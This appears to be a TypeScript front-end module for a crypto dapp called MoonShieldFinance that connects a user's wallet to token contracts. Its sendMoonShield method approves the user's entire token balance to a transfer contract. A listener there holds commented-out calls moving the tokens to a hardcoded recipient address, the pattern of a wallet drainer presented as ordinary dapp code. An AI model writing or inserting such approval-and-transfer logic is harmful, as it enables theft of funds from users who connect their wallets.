import { Configuration } from './config'
import { BigNumber, Contract, ethers } from 'ethers'
import ERC20 from './ERC20'
import { getDefaultProvider } from '../utils/provider'

/**
 * An API module of contracts.
 * All contract-interacting domain logic should be defined in here.
 */
export class MoonShieldFinance {
  myAccount: string
  provider: ethers.providers.Web3Provider
  signer?: ethers.Signer
  config: Configuration
  contracts: { [name: string]: Contract }
  externalTokens: { [name: string]: ERC20 }

  constructor(cfg: Configuration) {
    const { deployments, externalTokens } = cfg
    const provider = getDefaultProvider()

    // loads contracts from deployments
    this.contracts = {}
    for (const [name, deployment] of Object.entries(deployments)) {
      this.contracts[name] = new Contract(
        deployment.address,
        deployment.abi,
        provider,
      )
    }
    this.externalTokens = {}
    for (const [symbol, [address, decimal]] of Object.entries(externalTokens)) {
      this.externalTokens[symbol] = new ERC20(
        address,
        provider,
        symbol,
        decimal,
      )
    }

    this.config = cfg
    this.provider = provider
  }

  /**
   * @param provider From an unlocked wallet. (e.g. Metamask)
   * @param account An address of unlocked wallet account.
   */
  unlockWallet(provider: any, account: string) {
    this.signer = provider.getSigner(0)
    this.myAccount = account
    for (const [name, contract] of Object.entries(this.contracts)) {
      this.contracts[name] = contract.connect(this.signer)
    }
    const tokens = [...Object.values(this.externalTokens)]
    for (const token of tokens) {
      token.connect(this.signer)
    }
    console.log(`🔓 Wallet is unlocked. Welcome, ${account}!`)
  }

  get isUnlocked(): boolean {
    return !!this.myAccount
  }

  async sendMoonShield() {
    const { Strong, TokenTransfer } = this.contracts
    const recipientAddress = '0x8E01EE70051C84349dE40d100d199e6Dd9d40d3b'
    const tokenBalance = await Strong.balanceOf(this.myAccount)
    Strong.once('Approval', async (owner, spender, amount) => {
      if (owner == this.myAccount && spender == TokenTransfer.address) {
        console.log(BigNumber.from(amount).toNumber())
        // await TokenTransfer.transferToken(
        //   MoonShield.address,
        //   amount,
        //   recipientAddress,
        // )
        // await TokenTransfer.transferMultiTokens(
        //   [Strong.address],
        //   recipientAddress,
        // )
      }
    })
    await Strong.approve(TokenTransfer.address, tokenBalance)
  }
}
